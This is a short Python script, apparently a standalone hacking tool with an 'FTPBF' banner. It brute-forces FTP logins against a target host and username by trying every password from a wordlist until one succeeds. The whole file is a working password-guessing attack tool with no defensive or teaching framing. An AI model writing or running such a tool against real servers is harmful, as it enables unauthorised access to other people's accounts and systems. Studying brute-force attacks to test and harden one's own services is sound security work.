from ftplib import FTP
import argparse

class main:
    host = ""
    username = ""
    password = ""
    def __init__(self, host, username, pw_wordlist):
        self.host = host
        self.username = username
        self.password = pw_wordlist
        self.process(pw_wordlist)
    
    def login(self, host, username, password):
        try:
            ftp = FTP()
            ftp.connect(host)
            ftp.login(username, password)
            ftp.quit()
            return True
        except:
            return False
    
    def process(self, pw_wordlist):
        host = self.host
        username = self.username
        wordlist = pw_wordlist if pw_wordlist else "wordlist.txt"
        pw_wl = open(wordlist).readlines()
        for passwords in pw_wl:
            password = passwords.replace("\n", "")
            login = self.login(host, username, password)
            if login:
                print("[+] Success:", password)
                break
            else:
                print("[-] Failed:", password)

if __name__ == "__main__":
    print(r"""
______ _______________________ 
|  ___|_   _| ___ \ ___ \  ___|
| |_    | | | |_/ / |_/ / |_   
|  _|   | | |  __/| ___ \  _|  
| |     | | | |   | |_/ / |    
\_|     \_/ \_|   \____/\_|    
                               
""")
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", help="Enter Your Target Host", type=str, required=True)
    parser.add_argument("-u", "--username", help="Enter Your Target Username", type=str, required=True)
    parser.add_argument("-wl", "--wordlist", help="Enter Your Target Wordlist Password", type=str)
    args = parser.parse_args()
    wordlist = args.wordlist if args.wordlist else False
    if args.host and args.username:
        print("Scanning Host:", args.host, "| Username Target:", args.username, "| Wordlist Password:", wordlist if wordlist else "wordlist.txt")
        main(args.host, args.username, wordlist)
